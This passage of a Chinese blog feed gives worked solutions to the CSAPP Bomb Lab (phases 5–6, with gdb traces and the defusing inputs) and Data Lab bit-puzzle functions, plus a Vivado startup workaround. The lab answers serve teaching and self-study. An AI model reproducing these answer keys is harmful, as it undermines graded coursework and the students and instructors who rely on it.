()</div><div class="line">(gdb) print $rdx</div><div class="line">$6 = 1</div><div class="line">(gdb) x/s 6305984</div><div class="line">0x6038c0 &lt;input_strings+320&gt;:   &quot;abcdef&quot;</div></pre></td></tr></table></figure></p>
<p>上述测试结果可以看出：在这个循环中rbx寄存器是输入的字符串的基址，循环依次取一个字符，获取该字符ASCII码的低四位存放在edx寄存器中。继续单步运行，出现一个地址<code>0x4024b0</code>，查看如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) x/s 0x4024b0</div><div class="line">0x4024b0 &lt;array.3449&gt;:  &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</div></pre></td></tr></table></figure></p>
<p>可以看出这也是一个字符串（也可以看作字符数组）。</p>
<p>这样就能理解这一段循环的具体意义：按照输入的六个字符的ASCII码低四位为索引，从一个字符串中取出六个新的字符，存入栈帧<code>(rsp+0x0)~(rsp+0x5)</code>处。</p>
<p>继续运行会发现一个新的地址，通过命令查看存放的是一个六位的字符串：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) x/s 0x40245e</div><div class="line">0x40245e:       &quot;flyers&quot;</div></pre></td></tr></table></figure>
<p>接下来要比较这个字符串和上述索引所得的新字符串，也就是说我们需要输入一个字符串，通过一个索引，或者一个新的字符串”flyers”，这个通过计算可以知道输入的字符串是<code>ionefg</code>，我们重新运行<code>bomb</code>程序测试第五关是否通过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line">which to blow yourself up. Have a nice day!</div><div class="line">Border relations with Canada have never been better.</div><div class="line">Phase 1 defused. How about the next one?</div><div class="line">1 2 4 8 16 32</div><div class="line">That&apos;s number 2.  Keep going!</div><div class="line">1 311</div><div class="line">Halfway there!</div><div class="line">7 0</div><div class="line">So you got that one.  Try this one.</div><div class="line">ionefg</div><div class="line">Good work!  On to the next...</div></pre></td></tr></table></figure></p>
<p>第五关也正确通过。</p>
<h2 id="第六关：phase-6"><a href="#第六关：phase-6" class="headerlink" title="第六关：phase_6"></a>第六关：phase_6</h2><p>这一关的反汇编代码有点长，我们分段来看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp</div><div class="line">0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13</div><div class="line">0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi</div><div class="line">0x0000000000401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;</div></pre></td></tr></table></figure>
<p>最开始调用了一个<code>read_six_numbers</code>代表输入是六个数字，这样就可以采用单步调试并查看寄存器内存的方式，来理解反汇编代码（先输入<code>1 2 3 4 5 6</code>）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">(gdb) break phase_6</div><div class="line">Breakpoint 1 at 0x4010f4</div><div class="line">(gdb) run</div><div class="line">Starting program: /mnt/c/Users/xzjqx/Desktop/Study/计算机系统/CMU实验_2018/bomblab/bomb/bomb</div><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line">which to blow yourself up. Have a nice day!</div><div class="line">Border relations with Canada have never been better.</div><div class="line">Phase 1 defused. How about the next one?</div><div class="line">1 2 4 8 16 32</div><div class="line">That&apos;s number 2.  Keep going!</div><div class="line">1 311</div><div class="line">Halfway there!</div><div class="line">7 0</div><div class="line">So you got that one.  Try this one.</div><div class="line">ionefg</div><div class="line">Good work!  On to the next...</div><div class="line">1 2 3 4 5 6</div><div class="line"></div><div class="line">Breakpoint 1, 0x00000000004010f4 in phase_6 ()</div><div class="line">(gdb) break *0x40110b</div><div class="line">Breakpoint 2 at 0x40110b</div><div class="line">(gdb) continue</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 2, 0x000000000040110b in phase_6 ()</div><div class="line">(gdb) x/6d $rsp</div><div class="line">0x7ffffffedf00: 1       2       3       4</div><div class="line">0x7ffffffedf10: 5       6</div></pre></td></tr></table></figure>
<p>可以看出输入为六个32位数，且存入栈帧<code>(rsp+0x0)~(rsp+0x14)</code>处。</p>
<p>之后一段是一个循环，我把每一句都换成类似C语言的注释，能更好的理解这段代码的作用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14			# r14 = rsp </div><div class="line">0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d			# r12 = 0</div><div class="line">0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp			# rbp = r13</div><div class="line">0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax		# eax = [r13]</div><div class="line">0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax			# eax = eax -1</div><div class="line">0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax			# if(eax &gt; 5)</div><div class="line">0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;	#     return &quot;boom&quot;</div><div class="line">0x0000000000401123 &lt;+47&gt;:    callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d			# r12 = r12 + 1</div><div class="line">0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d			# if(r12 == 6)</div><div class="line">0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;	#     jump &lt;phase_6+95&gt;</div><div class="line">0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx			# ebx = r12</div><div class="line">0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax			# rax = ebx</div><div class="line">0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax	# eax = [rsp+rax*4]</div><div class="line">0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)		# if(eax == [rbp])</div><div class="line">0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;	#     return &quot;boom&quot;</div><div class="line">0x0000000000401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx			# ebx = ebx + 1</div><div class="line">0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx			# if(ebx &lt;= 5)</div><div class="line">0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;	#     jump &lt;phase_6+65&gt;</div><div class="line">0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13			# r13 = r13 + 4</div><div class="line">0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;	# jump &lt;phase_6+32&gt;</div></pre></td></tr></table></figure>
<p>根据翻译来的注释可以看出，这是一个二重循环：第一重循环确定每个输入都不大于6；第二重循环确定所有输入两两不相等。</p>
<p>接下来也是一段循环：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi</div><div class="line">0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax</div><div class="line">0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx</div><div class="line">0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx</div><div class="line">0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx</div><div class="line">0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)</div><div class="line">0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax</div><div class="line">0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax</div><div class="line">0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</div></pre></td></tr></table></figure>
<p>这段代码用7减去每一个输入，作为新的输入，运行程序再查看rsp寄存器地址存的六个32位数即可确认：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">(gdb) break *0x40116f</div><div class="line">Breakpoint 3 at 0x40116f</div><div class="line">(gdb) continue</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 3, 0x000000000040116f in phase_6 ()</div><div class="line">(gdb) x/6d $rsp</div><div class="line">0x7ffffffedf00: 6       5       4       3</div><div class="line">0x7ffffffedf10: 2       1</div></pre></td></tr></table></figure>
<p>下一段代码中有一个地址<code>0x6032d0</code> ，我们先查看其中的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(gdb) x/24d 0x6032d0</div><div class="line">0x6032d0 &lt;node1&gt;:       332     1       6304480 0</div><div class="line">0x6032e0 &lt;node2&gt;:       168     2       6304496 0</div><div class="line">0x6032f0 &lt;node3&gt;:       924     3       6304512 0</div><div class="line">0x603300 &lt;node4&gt;:       691     4       6304528 0</div><div class="line">0x603310 &lt;node5&gt;:       477     5       6304544 0</div><div class="line">0x603320 &lt;node6&gt;:       443     6       0       0</div></pre></td></tr></table></figure>
<p>结果类似一个结构体，下一段代码的作用就是使用我们输入的六位数对这个结构体重新排序，存入(rsp+0x18)处，可以设置断点查看重新排序的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(gdb) x/12d $rsp+0x18</div><div class="line">0x7ffffffedf18: 0       0       6304544 0</div><div class="line">0x7ffffffedf28: 6304528 0       6304512 0</div><div class="line">0x7ffffffedf38: 6304496 0       6304480 0</div></pre></td></tr></table></figure>
<p>可以看出，是按照<code>6 5 4 3 2 1</code>的顺序重新排列了，原因是之前经过了7-input的过程。</p>
<p>最后一段代码判断结构体中的第一个数字是否是降序排列，要排序的六个数是<code>332,168,924,691,477,443</code>要达到降序排列，需要把第三个结点放在第一位，第四个放在第二位……这样得出的输入序列为<code>3 4 5 6 1 2</code>，由于之前有一个7-input的过程，故正确答案应该是<code>4 3 2 1 6 5</code>。</p>
<p>最终结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line">which to blow yourself up. Have a nice day!</div><div class="line">Border relations with Canada have never been better.</div><div class="line">Phase 1 defused. How about the next one?</div><div class="line">1 2 4 8 16 32</div><div class="line">That&apos;s number 2.  Keep going!</div><div class="line">1 311</div><div class="line">Halfway there!</div><div class="line">7 0</div><div class="line">So you got that one.  Try this one.</div><div class="line">ionefg</div><div class="line">Good work!  On to the next...</div><div class="line">4 3 2 1 6 5</div><div class="line">Congratulations! You&apos;ve defused the bomb!</div></pre></td></tr></table></figure>
<p>所有炸弹都被拆除！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;深入理解计算机系统（CSAPP）的实验二是Bomb Lab。实验中有六道关卡，我们的任务是通过查看反汇编代码，在程序运行时，从键盘输入六条正确的字符串，才能通过这六道关卡。&lt;br&gt;
    
    </summary>
    
      <category term="计算机系统" scheme="http://xzjqx.data/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="C/C++" scheme="http://xzjqx.data/tags/C-C/"/>
    
      <category term="CSAPP" scheme="http://xzjqx.data/tags/CSAPP/"/>
    
  </entry>
  
  <entry>
    <title>Vivado问题总结</title>
    <link href="http://xzjqx.data/2018/04/14/Vivado%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://xzjqx.data/2018/04/14/Vivado问题总结/</id>
    <published>2018-04-14T05:21:46.000Z</published>
    <updated>2018-04-14T05:57:47.105Z</updated>
    
    <content type="html"><![CDATA[<p>记录Vivado使用过程中的一些问题。<br><a id="more"></a></p>
<h2 id="Vivado-2017-3-启动超时"><a href="#Vivado-2017-3-启动超时" class="headerlink" title="Vivado 2017.3 启动超时"></a>Vivado 2017.3 启动超时</h2><p>Vivado启动两分钟后弹出如下界面，显示Vivado启动超时：<br><img src="启动超时.png" alt="启动超时"><br>我是在更新了Windows10系统到1790版本后出现这一问题，在<a href="https://forums.xilinx.com" target="_blank" rel="external">Xilinx论坛</a>发现同一问题，Xilinx官方也发现并解决了这个BUG。</p>
<blockquote>
<p>After installing the Windows 10 Fall Creators update (version 1709), when I try to launch Vivado, it fails or crashes.</p>
</blockquote>
<p>解决方法如下<a href="https://www.xilinx.com/support/answers/69908.html" target="_blank" rel="external">AR# 69908</a>：</p>
<blockquote>
<p>While this update for Windows 10 is not officially supported with Vivado 2017.3, the following work-around is available:</p>
<ol>
<li>Navigate to (Vivado Installed Directory)\2017.3\bin\unwrapped\win64.o</li>
<li>Backup ‘<strong>vivado.exe</strong>‘ by renaming it to ‘<strong>vivado.exe.backup</strong>‘</li>
<li>Copy ‘<strong>vivado-vg.exe</strong>‘ and paste it into the same folder.</li>
<li>Rename ‘<strong>vivado-vg - Copy.exe</strong>‘ to ‘<strong>vivado.exe</strong>‘</li>
</ol>
</blockquote>
<p>简单翻译一下：<br>当Windows10更新之后发现不能打开Vivado时，执行以下步骤：</p>
<ul>
<li>进入“Vivado安装目录\2017.3\bin\unwrapped\win64.0\”</li>
<li>将’<strong>vivado.exe</strong>‘重命名为<strong>vivado.exe.backup</strong>‘</li>
<li>将’<strong>vivado-vg.exe</strong>‘ 复制到当前目录</li>
<li>重命名’<strong>vivado-vg - Copy.exe</strong>‘为’<strong>vivado.exe</strong>‘<br>之后再打开Vivado就不会报错了</li>
</ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录Vivado使用过程中的一些问题。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统（CSAPP）实验一 Data Lab</title>
    <link href="http://xzjqx.data/2018/04/13/datalab/"/>
    <id>http://xzjqx.data/2018/04/13/datalab/</id>
    <published>2018-04-13T11:18:03.000Z</published>
    <updated>2018-04-26T04:05:01.625Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bitAnd-x-amp-y-using-only-and"><a href="#bitAnd-x-amp-y-using-only-and" class="headerlink" title="bitAnd - x&amp;y using only ~ and |"></a>bitAnd - x&amp;y using only ~ and |</h2><p>目标：不使用&amp;运算符计算按位与运算<br>方法：运用德·摩根定律：非(P 且 Q) = (非 P) 或 (非 Q)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int bitAnd(int x, int y) &#123;</div><div class="line">  return ~((~x) | (~y));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<a id="more"></a>
<h2 id="getByte-Extract-byte-n-from-word-x"><a href="#getByte-Extract-byte-n-from-word-x" class="headerlink" title="getByte - Extract byte n from word x"></a>getByte - Extract byte n from word x</h2><p>目标：提取一个字中的特定一个字节<br>方法：将字向右移位到最低字节，再与0xff按位与得到目标字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int getByte(int x, int n) &#123;</div><div class="line">  return (x &gt;&gt; (n &lt;&lt; 3)) &amp; 0xff;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="logicalShift-shift-x-to-the-right-by-n-using-a-logical-shift"><a href="#logicalShift-shift-x-to-the-right-by-n-using-a-logical-shift" class="headerlink" title="logicalShift - shift x to the right by n, using a logical shift"></a>logicalShift - shift x to the right by n, using a logical shift</h2><p>目标：将x逻辑右移n位<br>方法：&gt;&gt;操作符是算术右移，故使用&gt;&gt;右移后，将高n位置零即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">int logicalShift(int x, int n) &#123;</div><div class="line">  int mask = ~(1 &lt;&lt; 31);   // mask = 0x7fffffff</div><div class="line">  mask = mask &gt;&gt; n;</div><div class="line">  mask = mask &lt;&lt; 1;</div><div class="line">  mask = mask + 1;         // mask高n位为0，低位为1</div><div class="line">  return (x &gt;&gt; n) &amp; mask;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="bitCount-returns-count-of-number-of-1’s-in-word"><a href="#bitCount-returns-count-of-number-of-1’s-in-word" class="headerlink" title="bitCount - returns count of number of 1’s in word"></a>bitCount - returns count of number of 1’s in word</h2><p>目标：计算x中有多少位1<br>方法：将x分为四个字节，分别计算1的数量（共计算八次），最后将结果分为四个字节计算总和即为最终答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">int bitCount(int x) &#123;</div><div class="line">  int result = 0;</div><div class="line">  int mask = 1 | (1 &lt;&lt; 8);</div><div class="line">  mask = mask | (mask &lt;&lt; 16);         // mask = 0x01010101</div><div class="line">  result = result + (x &amp; mask);</div><div class="line">  result = result + ((x&gt;&gt;1) &amp; mask);</div><div class="line">  result = result + ((x&gt;&gt;2) &amp; mask);</div><div class="line">  result = result + ((x&gt;&gt;3) &amp; mask);</div><div class="line">  result = result + ((x&gt;&gt;4) &amp; mask);</div><div class="line">  result = result + ((x&gt;&gt;5) &amp; mask);</div><div class="line">  result = result + ((x&gt;&gt;6) &amp; mask);</div><div class="line">  result = result + ((x&gt;&gt;7) &amp; mask);  // result的每一个字节为x在这个字节上1的数量</div><div class="line">  return (result &amp; 0xff) + ((result&gt;&gt;8) &amp;0xff) + ((result&gt;&gt;16) &amp;0xff) + ((result&gt;&gt;24) &amp;0xff);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="bang-Compute-x-without-using"><a href="#bang-Compute-x-without-using" class="headerlink" title="bang - Compute !x without using !"></a>bang - Compute !x without using !</h2><p>目标：不使用!运算符计算!x<br>方法：将x与-x进行或运算，若x为0，最高位为0，反之最高位为1；将结果右移31位得到0xffffffff或0x00000000，加上1即为最终结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">int bang(int x) &#123;</div><div class="line">  int tmp = ~x + 1;       // tmp = -x;</div><div class="line">  tmp = x | tmp;          // tmp = x | -x; 若x=0，最高位为0，反之最高位为1</div><div class="line">  return (tmp &gt;&gt; 31) + 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="tmin-return-minimum-two’s-complement-integer"><a href="#tmin-return-minimum-two’s-complement-integer" class="headerlink" title="tmin - return minimum two’s complement integer"></a>tmin - return minimum two’s complement integer</h2><p>目标：求得二进制整数的最小值<br>方法：1左移31位即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int tmin(void) &#123;</div><div class="line">  return 1&lt;&lt;31;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="fitsBits-return-1-if-x-can-be-represented-as-an-n-bit-two’s-complement-integer"><a href="#fitsBits-return-1-if-x-can-be-represented-as-an-n-bit-two’s-complement-integer" class="headerlink" title="fitsBits - return 1 if x can be represented as an n-bit, two’s complement integer."></a>fitsBits - return 1 if x can be represented as an n-bit, two’s complement integer.</h2><p>目标：如果x能被n位二进制补码表示，则返回1<br>方法：如果x能被n位二进制表示，则x前(32-n)位都是相同的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int fitsBits(int x, int n) &#123;</div><div class="line">  return !((x &lt;&lt; (33 + ~n) &gt;&gt; (33 + ~n)) ^ x);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="divpwr2-Compute-x-2-n-for-0-n-30"><a href="#divpwr2-Compute-x-2-n-for-0-n-30" class="headerlink" title="divpwr2 - Compute x/(2^n), for 0 ~ n ~ 30"></a>divpwr2 - Compute x/(2^n), for 0 ~ n ~ 30</h2><p>目标：计算 x/(2^n)<br>方法：对于正数，直接右移n位即可；对于负数，需要加上偏置量bias后右移</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">int divpwr2(int x, int n) &#123;</div><div class="line">  int sign = x &gt;&gt; 31;        // 若x为负数，sign = 0xffffffff</div><div class="line">  int mask = (1 &lt;&lt; n) + ~0; // mask为0x0000ffff形式</div><div class="line">  int bias = sign &amp; mask;   // 若x为负数，bias有值</div><div class="line">  return (x + bias) &gt;&gt; n;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="negate-return-x"><a href="#negate-return-x" class="headerlink" title="negate - return -x"></a>negate - return -x</h2><p>目标：求相反数<br>方法：补码取相反数，包含符号位一起取反再加一</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int negate(int x) &#123;</div><div class="line">  return ~x + 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="isPositive-return-1-if-x-gt-0-return-0-otherwise"><a href="#isPositive-return-1-if-x-gt-0-return-0-otherwise" class="headerlink" title="isPositive - return 1 if x &gt; 0, return 0 otherwise"></a>isPositive - return 1 if x &gt; 0, return 0 otherwise</h2><p>目标：判断x是否为正数<br>方法：直接通过x的符号位可以分出负数，再对x两次取非可以判断是否为0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int isPositive(int x) &#123;</div><div class="line">  return (!((x &gt;&gt; 31) &amp; 1) &amp; !!x);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="isLessOrEqual-if-x-is-less-or-euqal-y-then-return-1-else-return-0"><a href="#isLessOrEqual-if-x-is-less-or-euqal-y-then-return-1-else-return-0" class="headerlink" title="isLessOrEqual - if x is less or euqal y then return 1, else return 0"></a>isLessOrEqual - if x is less or euqal y then return 1, else return 0</h2><p>目标：判断是否x &lt;= y<br>方法：当x与y异号时，只要x为负数，x&lt;=y；当x与y同号时，利用isPositive函数的方法判断y-x是否为正数或0即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int isLessOrEqual(int x, int y) &#123;</div><div class="line">  int signx = (x &gt;&gt; 31) &amp; 1;</div><div class="line">  int signy = (y &gt;&gt; 31) &amp; 1;</div><div class="line">  int sign = (signx ^ signy) &amp; signx;               	 // 异号</div><div class="line">  int tmp = y + ~x + 1;</div><div class="line">  tmp = (!((tmp &gt;&gt; 31) &amp; 1)) &amp; (!(signx ^ signy));  // 同号</div><div class="line">  return (sign | tmp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="ilog2-return-floor-log-base-2-of-x-where-x-gt-0"><a href="#ilog2-return-floor-log-base-2-of-x-where-x-gt-0" class="headerlink" title="ilog2 - return floor(log base 2 of x), where x &gt; 0"></a>ilog2 - return floor(log base 2 of x), where x &gt; 0</h2><p>目标：求floor(log2x)<br>方法：通过二分法找到x中最高位1的位数，这个位数就是要求出的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">int ilog2(int x) &#123;</div><div class="line">  int bits=0;</div><div class="line">  bits = (!!(x&gt;&gt;16))&lt;&lt;4;</div><div class="line">  bits = bits + ((!!(x&gt;&gt;(bits+8)))&lt;&lt;3);</div><div class="line">  bits = bits + ((!!(x&gt;&gt;(bits+4)))&lt;&lt;2);</div><div class="line">  bits = bits + ((!!(x&gt;&gt;(bits+2)))&lt;&lt;1);</div><div class="line">  bits = bits + (!!(x&gt;&gt;(bits+1)));</div><div class="line">  bits = bits + (!!bits)+(~0)+(!(1^x));</div><div class="line">  return bits;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="float-neg-Return-bit-level-equivalent-of-expression-f-for-floating-point-argument-f"><a href="#float-neg-Return-bit-level-equivalent-of-expression-f-for-floating-point-argument-f" class="headerlink" title="float_neg - Return bit-level equivalent of expression -f for floating point argument f"></a>float_neg - Return bit-level equivalent of expression -f for floating point argument f</h2><p>目标：将浮点数uf取反<br>方法：若uf不是NaN，直接将符号位取反，否则返回uf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">unsigned float_neg(unsigned uf) &#123;</div><div class="line">  unsigned result;</div><div class="line">  unsigned tmp;</div><div class="line">  result=uf ^ 0x80000000; //将符号位改反</div><div class="line">  tmp=uf &amp; (0x7fffffff);</div><div class="line">  if(tmp &gt; 0x7f800000)    //此时是NaN</div><div class="line">    result = uf;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="float-i2f-Return-bit-level-equivalent-of-expression-float-x"><a href="#float-i2f-Return-bit-level-equivalent-of-expression-float-x" class="headerlink" title="float_i2f - Return bit-level equivalent of expression (float) x"></a>float_i2f - Return bit-level equivalent of expression (float) x</h2><p>目标：返回整数x的对应的浮点数的二进制表示形式<br>方法：这是一个求阶码与尾数的过程</p>
<p>由于整数x一定是规格化数，故按照规格化标准转化；因为规格化的值尾数定义为M=1+f，故将x左移到最高一位1超出32位时，剩下的即为尾数；阶码是32减去上述转移的位数，故阶码字段值为127+32-shift</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">unsigned float_i2f(int x) &#123;</div><div class="line">  unsigned sign = 0;         // 符号位</div><div class="line">  unsigned exp;              // 阶码</div><div class="line">  unsigned frac;             // 尾数</div><div class="line">  unsigned shift = 0, tmp, rounding = 0;</div><div class="line"></div><div class="line">  if(x == 0) return x;       // 为0时直接返回0</div><div class="line">  if(x &lt; 0) &#123;</div><div class="line">    x = -x;</div><div class="line">    sign = 1;</div><div class="line">  &#125;                          // x取绝对值，记录符号位</div><div class="line">  frac = x;</div><div class="line">  while(1) &#123;</div><div class="line">    tmp = frac;</div><div class="line">    shift ++;</div><div class="line">    frac &lt;&lt;= 1;</div><div class="line">    if(tmp &amp; 0x80000000) break;</div><div class="line">  &#125;                          </div><div class="line">  exp = (159 - shift) &lt;&lt; 23; // 计算阶码</div><div class="line">  if((frac &amp; 0x1ff) &gt; 0x100) rounding = 